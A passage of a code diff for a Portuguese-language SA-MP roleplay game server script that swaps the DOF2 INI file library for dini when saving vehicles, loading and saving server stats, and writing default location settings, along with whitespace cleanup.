+		dini_IntSet(ficheiro, "Kilometros", cInfo[i][Kilometros]);
+		dini_IntSet(ficheiro, "Metros", cInfo[i][Metros]);
+		dini_IntSet(ficheiro, "Neon", cInfo[i][Neon]);
+		dini_IntSet(ficheiro, "NeonStatus", cInfo[i][NeonStatus]);
+		dini_IntSet(ficheiro, "Gasolina", cInfo[i][Gasolina]);
+        dini_IntSet(ficheiro, "Trancado", cInfo[i][Trancado]);
+		dini_FloatSet(ficheiro, "Vida", cInfo[i][Vida]);
+		dini_IntSet(ficheiro, "mod1", cInfo[i][mod1]);
+		dini_IntSet(ficheiro, "mod2", cInfo[i][mod2]);
+		dini_IntSet(ficheiro, "mod3", cInfo[i][mod3]);
+		dini_IntSet(ficheiro, "mod4", cInfo[i][mod4]);
+		dini_IntSet(ficheiro, "mod5", cInfo[i][mod5]);
+		dini_IntSet(ficheiro, "mod6", cInfo[i][mod6]);
+		dini_IntSet(ficheiro, "mod7", cInfo[i][mod7]);
+		dini_IntSet(ficheiro, "mod8", cInfo[i][mod8]);
+		dini_IntSet(ficheiro, "mod9", cInfo[i][mod9]);
+		dini_IntSet(ficheiro, "mod10", cInfo[i][mod10]);
+		dini_IntSet(ficheiro, "mod11", cInfo[i][mod11]);
+		dini_IntSet(ficheiro, "Apreendido", cInfo[i][Apreendido]);
+		dini_IntSet(ficheiro, "Arma1", cInfo[i][Arma1]);
+		dini_IntSet(ficheiro, "Ammo1", cInfo[i][Ammo1]);
+		dini_IntSet(ficheiro, "Arma2", cInfo[i][Arma2]);
+		dini_IntSet(ficheiro, "Ammo2", cInfo[i][Ammo2]);
+		dini_IntSet(ficheiro, "Arma3", cInfo[i][Arma3]);
+		dini_IntSet(ficheiro, "Ammo3", cInfo[i][Ammo3]);
+		dini_Set(ficheiro, "Prop", cInfo[i][Prop]);
+		dini_Set(ficheiro, "CompradoEm", cInfo[i][CompradoEm]);
+		dini_IntSet(ficheiro, "RadioStatus", cInfo[i][RadioStatus]);
+		dini_IntSet(ficheiro, "IsCaravana", cInfo[i][IsCaravana]);
+		dini_IntSet(ficheiro, "CaravanaCasaID", cInfo[i][CaravanaCasaID]);
+		dini_IntSet(ficheiro, "Panels", cInfo[i][Panels]);
+		dini_IntSet(ficheiro, "Doors", cInfo[i][Doors]);
+		dini_IntSet(ficheiro, "Lights", cInfo[i][Lights]);
+		dini_IntSet(ficheiro, "Tires", cInfo[i][Tires]);
 
 	}
 	return 1;
@@ -12640,57 +12623,55 @@ public GuardarCarro(id)
 {
 	new ficheiro[64];
 	new i = id;
-	
+
  	format(ficheiro, sizeof(ficheiro), "PCRP/Carros/%d.ini", i);
 
-	DOF2_SetInt(ficheiro, "ID", cInfo[i][ID]);
-	DOF2_SetInt(ficheiro, "Model", cInfo[i][Model]);
-	DOF2_SetFloat(ficheiro, "X", cInfo[i][X]);
-	DOF2_SetFloat(ficheiro, "Y", cInfo[i][Y]);
-	DOF2_SetFloat(ficheiro, "Z", cInfo[i][Z]);
- 	DOF2_SetFloat(ficheiro, "Angle", cInfo[i][Angle]);
- 	DOF2_SetInt(ficheiro, "Color1", cInfo[i][Color1]);
- 	DOF2_SetInt(ficheiro, "Color2", cInfo[i][Color2]);
-  	DOF2_SetInt(ficheiro, "Faction", cInfo[i][Faction]);
-   	DOF2_SetInt(ficheiro, "Type", cInfo[i][Type]);
-   	DOF2_SetInt(ficheiro, "Comprado", cInfo[i][Comprado]);
-	DOF2_SetInt(ficheiro, "Travao", cInfo[i][Travao]);
-	DOF2_SetInt(ficheiro, "Kilometros", cInfo[i][Kilometros]);
-	DOF2_SetInt(ficheiro, "Metros", cInfo[i][Metros]);
-	DOF2_SetInt(ficheiro, "Neon", cInfo[i][Neon]);
-	DOF2_SetInt(ficheiro, "NeonStatus", cInfo[i][NeonStatus]);
-	DOF2_SetInt(ficheiro, "Gasolina", cInfo[i][Gasolina]);
-	DOF2_SetInt(ficheiro, "Trancado", cInfo[i][Trancado]);
-	DOF2_SetFloat(ficheiro, "Vida", cInfo[i][Vida]);
-	DOF2_SetInt(ficheiro, "mod1", cInfo[i][mod1]);
-	DOF2_SetInt(ficheiro, "mod2", cInfo[i][mod2]);
-	DOF2_SetInt(ficheiro, "mod3", cInfo[i][mod3]);
-	DOF2_SetInt(ficheiro, "mod4", cInfo[i][mod4]);
-	DOF2_SetInt(ficheiro, "mod5", cInfo[i][mod5]);
-	DOF2_SetInt(ficheiro, "mod6", cInfo[i][mod6]);
-	DOF2_SetInt(ficheiro, "mod7", cInfo[i][mod7]);
-	DOF2_SetInt(ficheiro, "mod8", cInfo[i][mod8]);
-	DOF2_SetInt(ficheiro, "mod9", cInfo[i][mod9]);
-	DOF2_SetInt(ficheiro, "mod10", cInfo[i][mod10]);
-	DOF2_SetInt(ficheiro, "mod11", cInfo[i][mod11]);
-	DOF2_SetInt(ficheiro, "Apreendido", cInfo[i][Apreendido]);
-	DOF2_SetInt(ficheiro, "Arma1", cInfo[i][Arma1]);
-	DOF2_SetInt(ficheiro, "Ammo1", cInfo[i][Ammo1]);
-	DOF2_SetInt(ficheiro, "Arma2", cInfo[i][Arma2]);
-	DOF2_SetInt(ficheiro, "Ammo2", cInfo[i][Ammo2]);
-	DOF2_SetInt(ficheiro, "Arma3", cInfo[i][Arma3]);
-	DOF2_SetInt(ficheiro, "Ammo3", cInfo[i][Ammo3]);
-	DOF2_SetString(ficheiro, "Prop", cInfo[i][Prop]);
-	DOF2_SetString(ficheiro, "CompradoEm", cInfo[i][CompradoEm]);
-	DOF2_SetInt(ficheiro, "RadioStatus", cInfo[i][RadioStatus]);
-	DOF2_SetInt(ficheiro, "IsCaravana", cInfo[i][IsCaravana]);
-	DOF2_SetInt(ficheiro, "CaravanaCasaID", cInfo[i][CaravanaCasaID]);
-	DOF2_SetInt(ficheiro, "Panels", cInfo[i][Panels]);
-	DOF2_SetInt(ficheiro, "Doors", cInfo[i][Doors]);
-	DOF2_SetInt(ficheiro, "Lights", cInfo[i][Lights]);
-	DOF2_SetInt(ficheiro, "Tires", cInfo[i][Tires]);
-
-	DOF2_SaveFile();
+	dini_IntSet(ficheiro, "ID", cInfo[i][ID]);
+	dini_IntSet(ficheiro, "Model", cInfo[i][Model]);
+	dini_FloatSet(ficheiro, "X", cInfo[i][X]);
+	dini_FloatSet(ficheiro, "Y", cInfo[i][Y]);
+	dini_FloatSet(ficheiro, "Z", cInfo[i][Z]);
+ 	dini_FloatSet(ficheiro, "Angle", cInfo[i][Angle]);
+ 	dini_IntSet(ficheiro, "Color1", cInfo[i][Color1]);
+ 	dini_IntSet(ficheiro, "Color2", cInfo[i][Color2]);
+  	dini_IntSet(ficheiro, "Faction", cInfo[i][Faction]);
+   	dini_IntSet(ficheiro, "Type", cInfo[i][Type]);
+   	dini_IntSet(ficheiro, "Comprado", cInfo[i][Comprado]);
+	dini_IntSet(ficheiro, "Travao", cInfo[i][Travao]);
+	dini_IntSet(ficheiro, "Kilometros", cInfo[i][Kilometros]);
+	dini_IntSet(ficheiro, "Metros", cInfo[i][Metros]);
+	dini_IntSet(ficheiro, "Neon", cInfo[i][Neon]);
+	dini_IntSet(ficheiro, "NeonStatus", cInfo[i][NeonStatus]);
+	dini_IntSet(ficheiro, "Gasolina", cInfo[i][Gasolina]);
+	dini_IntSet(ficheiro, "Trancado", cInfo[i][Trancado]);
+	dini_FloatSet(ficheiro, "Vida", cInfo[i][Vida]);
+	dini_IntSet(ficheiro, "mod1", cInfo[i][mod1]);
+	dini_IntSet(ficheiro, "mod2", cInfo[i][mod2]);
+	dini_IntSet(ficheiro, "mod3", cInfo[i][mod3]);
+	dini_IntSet(ficheiro, "mod4", cInfo[i][mod4]);
+	dini_IntSet(ficheiro, "mod5", cInfo[i][mod5]);
+	dini_IntSet(ficheiro, "mod6", cInfo[i][mod6]);
+	dini_IntSet(ficheiro, "mod7", cInfo[i][mod7]);
+	dini_IntSet(ficheiro, "mod8", cInfo[i][mod8]);
+	dini_IntSet(ficheiro, "mod9", cInfo[i][mod9]);
+	dini_IntSet(ficheiro, "mod10", cInfo[i][mod10]);
+	dini_IntSet(ficheiro, "mod11", cInfo[i][mod11]);
+	dini_IntSet(ficheiro, "Apreendido", cInfo[i][Apreendido]);
+	dini_IntSet(ficheiro, "Arma1", cInfo[i][Arma1]);
+	dini_IntSet(ficheiro, "Ammo1", cInfo[i][Ammo1]);
+	dini_IntSet(ficheiro, "Arma2", cInfo[i][Arma2]);
+	dini_IntSet(ficheiro, "Ammo2", cInfo[i][Ammo2]);
+	dini_IntSet(ficheiro, "Arma3", cInfo[i][Arma3]);
+	dini_IntSet(ficheiro, "Ammo3", cInfo[i][Ammo3]);
+	dini_Set(ficheiro, "Prop", cInfo[i][Prop]);
+	dini_Set(ficheiro, "CompradoEm", cInfo[i][CompradoEm]);
+	dini_IntSet(ficheiro, "RadioStatus", cInfo[i][RadioStatus]);
+	dini_IntSet(ficheiro, "IsCaravana", cInfo[i][IsCaravana]);
+	dini_IntSet(ficheiro, "CaravanaCasaID", cInfo[i][CaravanaCasaID]);
+	dini_IntSet(ficheiro, "Panels", cInfo[i][Panels]);
+	dini_IntSet(ficheiro, "Doors", cInfo[i][Doors]);
+	dini_IntSet(ficheiro, "Lights", cInfo[i][Lights]);
+	dini_IntSet(ficheiro, "Tires", cInfo[i][Tires]);
 
 	return 1;
 }
@@ -12704,161 +12685,161 @@ public MatriculasAtualizar()
 		{
 	     	format(message,sizeof(message), "0%d-SV-00",c);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 10 && c <= 99)
 		{
 	     	format(message,sizeof(message), "%d-RP-00",c);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 100 && c <= 109)
 		{
 	     	format(message,sizeof(message), "0%d-PT-01",c-100);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 110 && c <= 199)
 		{
 	     	format(message,sizeof(message), "%d-SA-01",c-100);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 200 && c <= 209)
 		{
 	     	format(message,sizeof(message), "0%d-MP-02",c-200);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 210 && c <= 299)
 		{
 	     	format(message,sizeof(message), "%d-GT-02",c-200);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 300 && c <= 309)
 		{
 	     	format(message,sizeof(message), "0%d-PF-03",c-300);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 310 && c <= 399)
 		{
 	     	format(message,sizeof(message), "%d-FM-03",c-300);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 400 && c <= 409)
 		{
 	     	format(message,sizeof(message), "0%d-AG-04",c-400);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 410 && c <= 499)
 		{
 	     	format(message,sizeof(message), "%d-FC-04",c-400);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 500 && c <= 509)
 		{
 	     	format(message,sizeof(message), "0%d-TT-05",c-500);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 510 && c <= 599)
 		{
 	     	format(message,sizeof(message), "%d-XU-05",c-500);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 600 && c <= 609)
 		{
 	     	format(message,sizeof(message), "0%d-FL-06",c-600);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 610 && c <= 699)
 		{
 	     	format(message,sizeof(message), "%d-AH-06",c-600);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 700 && c <= 709)
 		{
 	     	format(message,sizeof(message), "0%d-PU-07",c-700);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 710 && c <= 799)
 		{
 	     	format(message,sizeof(message), "%d-KG-07",c-700);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 800 && c <= 809)
 		{
 	     	format(message,sizeof(message), "0%d-UF-08",c-800);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 810 && c <= 899)
 		{
 	     	format(message,sizeof(message), "%d-TY-08",c-800);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 900 && c <= 909)
 		{
 	     	format(message,sizeof(message), "0%d-PD-09",c-900);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 		if(c >= 910 && c <= 999)
 		{
 	     	format(message,sizeof(message), "%d-HE-09",c-900);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1000 && c <= 1009)
 		{
 	     	format(message,sizeof(message), "0%d-QD-10",c-1000);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1010 && c <= 1099)
 		{
 	     	format(message,sizeof(message), "%d-IU-10",c-1000);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1100 && c <= 1109)
 		{
 	     	format(message,sizeof(message), "0%d-EY-11",c-1100);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1110 && c <= 1199)
@@ -12870,28 +12851,28 @@ public MatriculasAtualizar()
 		{
 	     	format(message,sizeof(message), "0%d-AJ-12",c-1200);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1210 && c <= 1299)
 		{
 	     	format(message,sizeof(message), "%d-AK-12",c-1200);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1300 && c <= 1309)
 		{
 	     	format(message,sizeof(message), "0%d-ZK-13",c-1300);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1310 && c <= 1399)
 		{
 	     	format(message,sizeof(message), "%d-QL-13",c-1300);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1400 && c <= 1409)
@@ -12905,84 +12886,84 @@ public MatriculasAtualizar()
 		{
 	     	format(message,sizeof(message), "%d-CR-14",c-1400);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1500 && c <= 1509)
 		{
 	     	format(message,sizeof(message), "0%d-ZA-15",c-1500);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1510 && c <= 1599)
 		{
 	     	format(message,sizeof(message), "%d-DW-15",c-1500);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1600 && c <= 1609)
 		{
 	     	format(message,sizeof(message), "0%d-OR-16",c-1600);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1610 && c <= 1699)
 		{
 	     	format(message,sizeof(message), "%d-TH-16",c-1600);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1700 && c <= 1709)
 		{
 	     	format(message,sizeof(message), "0%d-DK-17",c-1700);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1710 && c <= 1799)
 		{
 	     	format(message,sizeof(message), "%d-DO-17",c-1700);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1800 && c <= 1809)
 		{
 	     	format(message,sizeof(message), "0%d-LI-18",c-1800);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1810 && c <= 1899)
 		{
 	     	format(message,sizeof(message), "%d-DW-18",c-1800);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1900 && c <= 1909)
 		{
 	     	format(message,sizeof(message), "0%d-ZJ-19",c-1900);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c >= 1910 && c <= 1999)
 		{
 	     	format(message,sizeof(message), "%d-GP-19",c-1900);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
      	if(c == 2000)
 		{
 	     	format(message,sizeof(message), "%d-ZE-20",c-2000);
 	     	SetVehicleNumberPlate(c, message);
-	     	
+
 	     	cInfo[c][Matricula] = message;
      	}
 	}
@@ -12999,41 +12980,39 @@ public CarregarStats()
 
 	format(ficheiro, sizeof(ficheiro), "PCRP/Outros/Stats.ini");
 
-	if(!DOF2_FileExists(ficheiro))
+	if(!dini_Exists(ficheiro))
 	{
-		DOF2_CreateFile(ficheiro);
-		
-		DOF2_SetInt(ficheiro, "JoinCount", 0);
-		DOF2_SetInt(ficheiro, "MinutesPlayed", 0);
-		DOF2_SetInt(ficheiro, "Ajudas", 0);
-		DOF2_SetInt(ficheiro, "Comandos", 0);
-		DOF2_SetInt(ficheiro, "AJs", 0);
-		DOF2_SetInt(ficheiro, "Kicks", 0);
-		DOF2_SetInt(ficheiro, "Bans", 0);
-		DOF2_SetInt(ficheiro, "Rotas", 0);
-		DOF2_SetInt(ficheiro, "VIPs", 0);
-		DOF2_SetInt(ficheiro, "CarrosComprados", 0);
-		DOF2_SetInt(ficheiro, "PMs", 0);
+		dini_Create(ficheiro);
 
-		DOF2_SaveFile();
+		dini_IntSet(ficheiro, "JoinCount", 0);
+		dini_IntSet(ficheiro, "MinutesPlayed", 0);
+		dini_IntSet(ficheiro, "Ajudas", 0);
+		dini_IntSet(ficheiro, "Comandos", 0);
+		dini_IntSet(ficheiro, "AJs", 0);
+		dini_IntSet(ficheiro, "Kicks", 0);
+		dini_IntSet(ficheiro, "Bans", 0);
+		dini_IntSet(ficheiro, "Rotas", 0);
+		dini_IntSet(ficheiro, "VIPs", 0);
+		dini_IntSet(ficheiro, "CarrosComprados", 0);
+		dini_IntSet(ficheiro, "PMs", 0);
 	}
 	else
 	{
-        sStats[0][JoinCount] = DOF2_GetInt(ficheiro, "JoinCount");
-        sStats[0][MinutesPlayed] = DOF2_GetInt(ficheiro, "MinutesPlayed");
-        sStats[0][Ajudas] = DOF2_GetInt(ficheiro, "Ajudas");
-        sStats[0][Comandos] = DOF2_GetInt(ficheiro, "Comandos");
-        sStats[0][AJs] = DOF2_GetInt(ficheiro, "AJs");
-        sStats[0][Kicks] = DOF2_GetInt(ficheiro, "Kicks");
-        sStats[0][Bans] = DOF2_GetInt(ficheiro, "Bans");
-        sStats[0][Rotas] = DOF2_GetInt(ficheiro, "Rotas");
-        sStats[0][VIPs] = DOF2_GetInt(ficheiro, "VIPs");
-        sStats[0][CarrosComprados] = DOF2_GetInt(ficheiro, "CarrosComprados");
-        sStats[0][PMs] = DOF2_GetInt(ficheiro, "PMs");
+        sStats[0][JoinCount] = dini_Int(ficheiro, "JoinCount");
+        sStats[0][MinutesPlayed] = dini_Int(ficheiro, "MinutesPlayed");
+        sStats[0][Ajudas] = dini_Int(ficheiro, "Ajudas");
+        sStats[0][Comandos] = dini_Int(ficheiro, "Comandos");
+        sStats[0][AJs] = dini_Int(ficheiro, "AJs");
+        sStats[0][Kicks] = dini_Int(ficheiro, "Kicks");
+        sStats[0][Bans] = dini_Int(ficheiro, "Bans");
+        sStats[0][Rotas] = dini_Int(ficheiro, "Rotas");
+        sStats[0][VIPs] = dini_Int(ficheiro, "VIPs");
+        sStats[0][CarrosComprados] = dini_Int(ficheiro, "CarrosComprados");
+        sStats[0][PMs] = dini_Int(ficheiro, "PMs");
 	}
 
 	tick2 = GetTickCount();
-	printf("\n [PC:RP] Stats carregados (%d ms)", oInfo[0][RegistoCounter], tick2-tick1);
+	printf(" [PC:RP] Stats carregados (%d ms)", oInfo[0][RegistoCounter], tick2-tick1);
 
 	return 1;
 }
@@ -13043,21 +13022,18 @@ public GuardarStats()
 	new ficheiro[64];
 
 	format(ficheiro, sizeof(ficheiro), "PCRP/Outros/Stats.ini");
-	
-	DOF2_SetInt(ficheiro, "JoinCount", sStats[0][JoinCount]);
-	DOF2_SetInt(ficheiro, "MinutesPlayed", sStats[0][MinutesPlayed]);
-	DOF2_SetInt(ficheiro, "Ajudas", sStats[0][Ajudas]);
-	DOF2_SetInt(ficheiro, "Comandos", sStats[0][Comandos]);
-	DOF2_SetInt(ficheiro, "AJs", sStats[0][AJs]);
-	DOF2_SetInt(ficheiro, "Kicks", sStats[0][Kicks]);
-	DOF2_SetInt(ficheiro, "Bans", sStats[0][Bans]);
-	DOF2_SetInt(ficheiro, "Rotas", sStats[0][Rotas]);
-	DOF2_SetInt(ficheiro, "VIPs", sStats[0][VIPs]);
-	DOF2_SetInt(ficheiro, "CarrosComprados", sStats[0][CarrosComprados]);
-	DOF2_SetInt(ficheiro, "PMs", sStats[0][PMs]);
-	
 
-	DOF2_SaveFile();
+	dini_IntSet(ficheiro, "JoinCount", sStats[0][JoinCount]);
+	dini_IntSet(ficheiro, "MinutesPlayed", sStats[0][MinutesPlayed]);
+	dini_IntSet(ficheiro, "Ajudas", sStats[0][Ajudas]);
+	dini_IntSet(ficheiro, "Comandos", sStats[0][Comandos]);
+	dini_IntSet(ficheiro, "AJs", sStats[0][AJs]);
+	dini_IntSet(ficheiro, "Kicks", sStats[0][Kicks]);
+	dini_IntSet(ficheiro, "Bans", sStats[0][Bans]);
+	dini_IntSet(ficheiro, "Rotas", sStats[0][Rotas]);
+	dini_IntSet(ficheiro, "VIPs", sStats[0][VIPs]);
+	dini_IntSet(ficheiro, "CarrosComprados", sStats[0][CarrosComprados]);
+	dini_IntSet(ficheiro, "PMs", sStats[0][PMs]);
 
 	return 1;
 }
@@ -13071,287 +13047,285 @@ public CarregarOutros()
 	tick1 = GetTickCount();
 
 	format(ficheiro, sizeof(ficheiro), "PCRP/Outros/Outros.ini");
-	
-	if(!DOF2_FileExists(ficheiro))
-	{
-		DOF2_CreateFile(ficheiro);
 
-		DOF2_SetInt(ficheiro, "RegistoCounter", 0);
-		DOF2_SetFloat(ficheiro, "LicX", 0);
-		DOF2_SetFloat(ficheiro, "LicY", 0);
-		DOF2_SetFloat(ficheiro, "LicZ", 0);
-		DOF2_SetInt(ficheiro, "LicPickupID", 1239);
-		DOF2_SetInt(ficheiro, "LicVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "LicInterior", 0);
-		DOF2_SetFloat(ficheiro, "EmpregoX", 0);
-		DOF2_SetFloat(ficheiro, "EmpregoY", 0);
-		DOF2_SetFloat(ficheiro, "EmpregoZ", 0);
-		DOF2_SetInt(ficheiro, "EmpregoPickupID", 1239);
-		DOF2_SetInt(ficheiro, "EmpregoVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "EmpregoInterior", 0);
-		DOF2_SetFloat(ficheiro, "PrenderX", 0);
-		DOF2_SetFloat(ficheiro, "PrenderY", 0);
-		DOF2_SetFloat(ficheiro, "PrenderZ", 0);
-		DOF2_SetInt(ficheiro, "PrenderVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "PrenderInterior", 0);
-		DOF2_SetInt(ficheiro, "Impostos", 0);
-		DOF2_SetInt(ficheiro, "FundoDesemprego", 0);
-		DOF2_SetFloat(ficheiro, "ComprarDrogasX", 0);
-		DOF2_SetFloat(ficheiro, "ComprarDrogasY", 0);
-		DOF2_SetFloat(ficheiro, "ComprarDrogasZ", 0);
-		DOF2_SetInt(ficheiro, "ComprarDrogasVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "ComprarDrogasInterior", 0);
-		DOF2_SetFloat(ficheiro, "ComprarMateriaisX", 0);
-		DOF2_SetFloat(ficheiro, "ComprarMateriaisY", 0);
-		DOF2_SetFloat(ficheiro, "ComprarMateriaisZ", 0);
-		DOF2_SetInt(ficheiro, "ComprarMateriaisVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "ComprarMateriaisInterior", 0);
-		DOF2_SetFloat(ficheiro, "EntregarDrogasX", 0);
-		DOF2_SetFloat(ficheiro, "EntregarDrogasY", 0);
-		DOF2_SetFloat(ficheiro, "EntregarDrogasZ", 0);
-		DOF2_SetInt(ficheiro, "EntregarDrogasVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "EntregarDrogasInterior", 0);
-		DOF2_SetFloat(ficheiro, "EntregarMateriaisX", 0);
-		DOF2_SetFloat(ficheiro, "EntregarMateriaisY", 0);
-		DOF2_SetFloat(ficheiro, "EntregarMateriaisZ", 0);
-		DOF2_SetInt(ficheiro, "EntregarMateriaisVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "EntregarMateriaisInterior", 0);
-		DOF2_SetFloat(ficheiro, "TunningX", 0);
-		DOF2_SetFloat(ficheiro, "TunningY", 0);
-		DOF2_SetFloat(ficheiro, "TunningZ", 0);
-		DOF2_SetInt(ficheiro, "TunningVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "TunningInterior", 0);
-		DOF2_SetInt(ficheiro, "TunningPickupID", 1239);
-		DOF2_SetFloat(ficheiro, "Banco1X", 0);
-		DOF2_SetFloat(ficheiro, "Banco1Y", 0);
-		DOF2_SetFloat(ficheiro, "Banco1Z", 0);
-		DOF2_SetInt(ficheiro, "Banco1PickupID", 1239);
-		DOF2_SetInt(ficheiro, "Banco1VirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "Banco1Interior", 0);
-		DOF2_SetFloat(ficheiro, "Banco2X", 0);
-		DOF2_SetFloat(ficheiro, "Banco2Y", 0);
-		DOF2_SetFloat(ficheiro, "Banco2Z", 0);
-		DOF2_SetInt(ficheiro, "Banco2VirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "Banco2Interior", 0);
-        DOF2_SetInt(ficheiro, "Banco2PickupID", 1239);
-        DOF2_SetInt(ficheiro, "PrecoAtestarG", 1);
-		DOF2_SetFloat(ficheiro, "PoliciaX", 0);
-		DOF2_SetFloat(ficheiro, "PoliciaY", 0);
-		DOF2_SetFloat(ficheiro, "PoliciaZ", 0);
-		DOF2_SetInt(ficheiro, "PoliciaVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "PoliciaInterior", 0);
-		DOF2_SetInt(ficheiro, "PoliciaPickupID", 1239);
-		DOF2_SetFloat(ficheiro, "ApreendidosX", 2329.2659);
-		DOF2_SetFloat(ficheiro, "ApreendidosY", 2445.7922);
-		DOF2_SetFloat(ficheiro, "ApreendidosZ", 4.4461);
-		DOF2_SetFloat(ficheiro, "ApreendidosA", 85.0567);
-		DOF2_SetInt(ficheiro, "ApreendidosVirtualWorld", 1);
-		DOF2_SetInt(ficheiro, "ApreendidosInterior", 0);
-		DOF2_SetFloat(ficheiro, "EntradaApreendidosX", 0);
-		DOF2_SetFloat(ficheiro, "EntradaApreendidosY", 0);
-		DOF2_SetFloat(ficheiro, "EntradaApreendidosZ", 0);
-		DOF2_SetFloat(ficheiro, "EntradaApreendidosA", 0);
-		DOF2_SetInt(ficheiro, "EntradaApreendidosVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "EntradaApreendidosInterior", 0);
-		DOF2_SetFloat(ficheiro, "VenderVeiculoX", 0);
-		DOF2_SetFloat(ficheiro, "VenderVeiculoY", 0);
-		DOF2_SetFloat(ficheiro, "VenderVeiculoZ", 0);
-		DOF2_SetFloat(ficheiro, "CamaraMunicipalX", 0);
-		DOF2_SetFloat(ficheiro, "CamaraMunicipalY", 0);
-		DOF2_SetFloat(ficheiro, "CamaraMunicipalZ", 0);
-		DOF2_SetInt(ficheiro, "CamaraMunicipalVirtualWorld", 0);
-		DOF2_SetInt(ficheiro, "CamaraMunicipalInterior", 0);
-		DOF2_SetInt(ficheiro, "CamaraMunicipalPickupID", 1239);
-  		DOF2_SetString(ficheiro, "NewsMusica1", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica2", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica3", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica4", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica5", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica6", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica1Alterador", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica2Alterador", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica3Alterador", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica4Alterador", "Unused");
-  		DOF2_SetString(ficheiro, "NewsMusica5Alterador", "Unused");
